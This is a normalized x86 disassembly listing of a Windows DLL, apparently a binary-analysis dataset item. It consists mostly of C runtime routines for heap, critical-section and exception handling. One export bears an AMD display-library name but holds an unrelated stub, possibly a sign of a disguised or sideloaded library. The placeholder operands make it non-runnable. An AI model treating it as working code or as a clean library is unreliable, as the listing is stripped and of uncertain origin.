mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002e300
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x14
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_1002f316
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_100677cc
add esp 0xc
pop ebp
retn
sub_1002f5d0
call sub_1002d269
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10032de0
sub_1002f8bd
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002ffe4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100301ae
mov ecx [ ebp - 0x14 ]
call sub_100591cb
push 0x0
push 0x0
call sub_10055e2a
int3
sub_100301c0
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10004023
add esp 0xc
pop ebp
retn
sub_10030299
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_100302aa
call sub_1002d269
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10032de0
sub_10030740
mov [ ecx ] r--data
retn
sub_10030c00
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
mov ecx [ ebp + 0x18 ]
call sub_10060ea0
pop ebp
retn
sub_10030c20
mov eax ecx
retn 0xc
sub_10030c25
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10030c7c
push 0x1
call sub_10083737
pop ecx
retn
sub_10030f53
call sub_1002d269
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10032de0
sub_10031155
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_10055e2a
int3
call sub_1003f580
sub_10032090
mov eax [ eax ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_100324c0
xor eax eax
xor edx edx
retn
sub_10032dcc
xor eax eax
inc eax
retn
sub_10032e4d
push 0xc
call sub_10037434
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_10033150
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
call sub_1006f0c0
pop edi
pop ebx
pop ebp
retn
sub_100332a0
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10033a60
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_1006a000
pop ebx
pop ebp
retn
sub_10033b2e
mov ecx [ ebp - 0x14 ]
push ecx
call sub_1000a86e
add esp 0x4
push 0x0
push 0x0
call sub_10055e2a
int3
sub_1003450a
push 0xd
call sub_10037434
pop ecx
retn
sub_10034513
push 0xc
call sub_10037434
pop ecx
retn
sub_1003451c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1006a842
add esp 0xc
pop ebp
retn
sub_10037430
or eax 0xffffffff
retn
sub_10037434
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100374f8
push 0xd
call sub_10037434
pop ecx
retn
sub_10037504
push 0xc
call sub_10037434
pop ecx
retn
sub_1003750d
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_10037f0e
mov eax [ ecx + 0x4 ]
retn
ADL2_Display_Gamut_Set
push 0x0
call [ GetModuleHandleW@IAT ]
movzx eax [ eax + 0x1 ]
cdq
mov ecx 0x5a
idiv ecx
lea eax [ edx * 4 + 0x4 ]
retn
sub_10038c8a
push 0x8
push r--data
call sub_1007fad0
call sub_1002d269
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_10030ed0
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10038caa
xor eax eax
inc eax
retn
sub_10039fb0
mov eax 0x1
retn
sub_1003a0de
mov edx [ ebp - 0x14 ]
push edx
call sub_1000a86e
add esp 0x4
push 0x0
push 0x0
call sub_10055e2a
int3
sub_1003a1e3
mov edi edi
push ebp
mov ebp esp
call sub_1004e20d
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_10023c3a
sub_1003a329
call sub_1002d269
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_10038c8a
call eax
sub_1003a3b8
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003a3d5
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1003a6a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ eax + 0x3e ]
mov edx [ ebp + 0xc ]
cmp [ edx + 0x3e ] cl
sbb eax eax
neg eax
pop ebp
retn
sub_1003a6b5
or eax 0xffffffff
retn 0x8
sub_1003a910
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1003a9f0
mov eax r-xdata
retn
sub_1003ab28
push 0xc
call sub_10037434
pop ecx
retn
sub_1003ab34
push 0xc
call sub_10037434
pop ecx
retn
sub_1003ab65
and [ esi + 0x70 ] 0xffffffef
retn
sub_1003ac10
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0x100
push edx
call sub_1001ba2b
add esp 0x10
pop ebp
retn
sub_1003c140
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1006803e
sub_1003d06d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_10030f53
sub_1003d437
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10023cd6
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1003d5a1
call sub_1006a5b4
retn
sub_1003d5a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
sub_1003d5be
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1001f5e0
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_1003d5da
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_1001b2d2
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1003d5f6
xor eax eax
retn 0x8
sub_1003d7d0
mov ax [ ecx + 0xc ]
retn
sub_1003d7d5
call sub_1002d269
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10032de0
sub_1003e1a8
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1003e294
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_1003e403
push [ ebp + 0x8 ]
call sub_1002e42c
pop ecx
retn
sub_1003ef2f
push 0x2
call sub_1004929a
sub_1003f53f
push esi
call sub_10027713
pop ecx
retn
sub_1003f580
push ecx
push esi
call sub_100477f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop ecx
retn
sub_10040130
xor eax eax
retn 0x8
sub_10040675
push 0x0
push 0x1
call sub_10069470
retn
sub_100412eb
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_10041309
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1007f0fd
add esp 0xc
pop ebp
retn
sub_1004131f
call sub_1002d269
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_10042690
mov eax 0x80004001
retn 0xc
sub_10043190
mov ecx [ ebp - 0x14 ]
call sub_100560bd
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
int3
sub_10043240
xor eax eax
retn 0x4
sub_10044590
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn 0x10
sub_100453a3
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100453c0
mov eax 0x6
retn
sub_10045870
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
jmp edx
xor eax eax
retn
sub_100466f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_10016734
add esp 0x8
pop ebp
retn 0x4
sub_1004675b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004a920
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10046843
push ebx
call sub_1002e42c
pop ecx
retn
j_sub_100299a0
jmp sub_100299a0
sub_1004701d
mov ecx [ ebp - 0x14 ]
call sub_100560bd
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
int3
sub_100477df
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_10047b72
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10048ffc
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000aed0
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10049280
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_10063780
push esi
call sub_1000a86e
add esp 0x4
sub_1004929a
mov edi edi
push ebp
mov ebp esp
call sub_10032438
push [ ebp + 0x8 ]
call sub_10053809
pop ecx
push 0xff
call sub_10041309
int3
sub_1004aab3
mov eax rw-data
retn
sub_1004b490
retn 0x4
sub_1004b4a0
mov eax [ ecx + 0x4 ]
push eax
call sub_1000a86e
pop ecx
retn
sub_1004c8dd
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_100304a2
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1004e20d
mov eax sub_1007012c
mov [ rw-data ] eax
mov [ rw-data ] sub_10023940
mov [ rw-data ] sub_1001ea2c
mov [ rw-data ] sub_10063ac0
mov [ rw-data ] sub_10047b56
mov [ rw-data ] eax
mov [ rw-data ] sub_10021cea
mov [ rw-data ] sub_10032471
mov [ rw-data ] sub_10027d03
mov [ rw-data ] sub_100660f1
retn
sub_1004f4d7
mov eax 0x1
retn
sub_1004f5c0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_1001b2d2
add esp 0x4
sub_10050091
push 0x1
call sub_10037434
pop ecx
retn
sub_10050710
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_10048b50
add esp 0x8
pop ebp
retn 0x4
sub_10050ab9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_1005145f
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_10051cc8
xor eax eax
retn 0x10
sub_10051f08
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10066bdd
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100523b0
push esi
jmp [ edx * 4 + r-xdata ]
sub_10053e8c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000f245
sub_10054cc0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x18 ]
call sub_100486a0
pop edi
pop ebp
retn
sub_10054d39
push 0xe
call sub_10037434
pop ecx
retn
sub_100560bd
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10019274
push [ esi + 0xc ]
call sub_10019274
pop ecx
pop ecx
pop esi
retn
sub_100560e0
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_100567b3
mov eax [ ebp - 0x14 ]
push eax
call sub_1000a86e
add esp 0x4
push 0x0
push 0x0
call sub_10055e2a
int3
sub_100575db
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10051ca7
add esp 0x10
pop ebp
retn 0xc
sub_10057890
push ecx
mov [ ecx ] r--data
call sub_10027450
pop ecx
retn
sub_10057921
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_100195b1
pop ecx
mov [ rw-data ] 0x1
sub_10057ba3
mov eax [ ebp - 0x14 ]
push eax
call sub_1000a86e
add esp 0x4
push 0x0
push 0x0
call sub_10055e2a
int3
sub_10057ecf
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1004a920
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100583bc
push ebx
call sub_1002e42c
pop ecx
retn
sub_1005ab6b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_1005ad80
push esi
mov esi ecx
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x90 ] 0x0
sub_1005bace
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_10069470
push esi
push esi
call sub_10055e2a
int3
sub_1005bcfc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_1005cc4d
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_1001b2d2
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1005dbd0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
jmp eax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ eax ]
movzx eax [ eax ]
retn
sub_1005dd3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1005df1e
mov eax rw-data
retn
sub_1005ee00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_100304a2
add esp 0x8
pop ebp
retn 0x4
sub_1005fac9
push 0x1
push 0x0
push 0x0
call sub_1007f0fd
add esp 0xc
retn
sub_1005fe21
push 0xa
call sub_10037434
pop ecx
retn
sub_100603e0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10060d30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1006164e
push 0x0
call sub_10052923
pop ecx
retn
sub_10061771
push 0xd
call sub_10037434
pop ecx
retn
sub_1006177d
push 0xc
call sub_10037434
pop ecx
retn
sub_100635cc
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10066bdd
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100637dc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_100639af
call sub_10030c7c
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1001b2d2
pop ecx
retn
call sub_1004fffe
sub_10063ac0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_100660f1
pop ecx
pop ecx
pop ebp
retn
sub_10063ad3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100174e1
add esp 0x14
pop ebp
retn
sub_10063af0
mov eax ecx
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_10063c39
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10063c42
mov esp [ ebp - 0x18 ]
call sub_10038c8a
sub_10064030
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
add ecx 0x8
push ecx
push 0x5
push eax
call sub_100417e0
add esp 0xc
pop ebp
retn
sub_100660cf
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_1001b2d2
pop ecx
sub_100669b4
mov ecx [ ebp - 0x18 ]
call sub_100098f5
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
int3
sub_100677cc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1008044b
add esp 0x10
pop ebp
retn
sub_10067a82
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1003a66a
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_10067a9a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f28b
add esp 0x14
pop ebp
retn
sub_10068459
mov eax [ ebp - 0x14 ]
push eax
call sub_1000a86e
add esp 0x4
push 0x0
push 0x0
call sub_10055e2a
int3
sub_10068470
push esi
xor esi esi
mov eax 0xcccccccd
mul ecx
shr edx 0x3
mov ecx edx
inc esi
test ecx ecx
jne r-xdata
mov eax esi
pop esi
retn
sub_10068490
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_1006854e
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_10016734
pop ecx
pop ecx
pop ebp
retn 0x4
sub_100685ca
mov ecx [ ebp - 0x14 ]
call sub_100560bd
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
int3
sub_10068d25
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_1001b2d2
pop ecx
sub_100693b0
push [ ecx ]
call sub_100263f7
pop ecx
retn
sub_100693b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x10
sub_1006940d
xor al al
retn
sub_10069907
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000bca9
add esp 0x14
pop ebp
retn
sub_10069930
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_100699df
push sub_10038c8a
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_10069de6
mov ax [ ecx + 0xc ]
retn
sub_1006a296
call sub_1002d269
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10032de0
sub_1006a5b4
push 0x8
call sub_10037434
pop ecx
retn
sub_1006a965
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_1006ad26
and [ rw-data ] 0x0
retn
sub_1006ad2e
retn 0x4
sub_1006b58f
mov eax [ ecx + 0x8 ]
retn
sub_1006cc39
mov eax 0x1
retn
sub_1006d071
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1006dc74
mov ecx [ ebp - 0x1c ]
call sub_100098f5
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
int3
sub_1006de02
push [ ebp - 0x14 ]
call sub_10045b86
pop ecx
retn
sub_1006de46
call sub_1002d269
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1002d269
dec [ eax + 0x90 ]
sub_1006e175
call sub_1002d269
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_10032de0
sub_1006ee61
mov eax 0x1
retn
sub_1006efa0
mov eax 0x80004001
retn 0x14
sub_1006eff0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_100718b0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_10071972
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1003f2b0
sub_10071b2c
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10066bdd
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10071b48
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_10053809
push 0x1
push 0x0
call sub_10030f32
add esp 0xc
jmp sub_10030ed0
call eax
sub_10071bc0
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_10071d65
call sub_1002d269
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_100727e0
push 0x0
call sub_1002be70
int3
sub_10073280
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_10021090
add esp 0x4
pop ebp
retn
sub_100732a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call sub_1001b2d2
add esp 0x4
pop ebp
retn
sub_10079ee0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] 0x0
mov ecx 0x20
call sub_10079830
pop ebx
pop ebp
retn
sub_1007a030
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ecx ] 0x2
mov ecx 0x20
call sub_10079830
pop ebx
pop ebp
retn
sub_1007f057
push 0xc
push r--data
call sub_1007fad0
call sub_1002d269
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_10013a2a
sub_1007f08c
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_10041309
int3
sub_1007f228
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10037434
pop ecx
sub_1007f490
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_100454c9
pop ecx
pop ecx
retn
sub_1007fb15
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10081663
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_1003db31
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_10081989
push 0x4
mov eax sub_100850f6
call sub_100259bb
call sub_1002d269
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1003a329
call sub_10032da8
sub_10081a62
mov eax [ ebp - 0x14 ]
call sub_100818ce
retn
sub_100822e6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10082210
add esp 0xc
pop ebp
retn 0x4
sub_10082319
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10083715
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1008234b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10082210
add esp 0xc
pop ebp
retn 0x8
sub_10082fb6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10080420
sub_100836e9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10083620
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10083734
call eax
retn
sub_100837d9
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10036f94
pop ecx
pop ecx
retn
sub_10083808
push 0x1
call sub_10037434
pop ecx
retn
sub_10083cd1
push r-xdata
call sub_10064546
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10084af9
push 0x7
call sub_10037434
pop ecx
retn
sub_10084c50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10032529
